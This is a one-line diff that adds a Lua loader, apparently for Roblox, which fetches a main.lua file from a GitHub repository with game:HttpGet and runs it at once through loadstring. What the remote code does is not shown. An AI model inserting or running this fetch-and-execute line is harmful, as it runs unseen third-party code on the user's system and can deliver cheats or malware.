@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NorgumiBackup/Storage/refs/heads/main/main.lua"))()
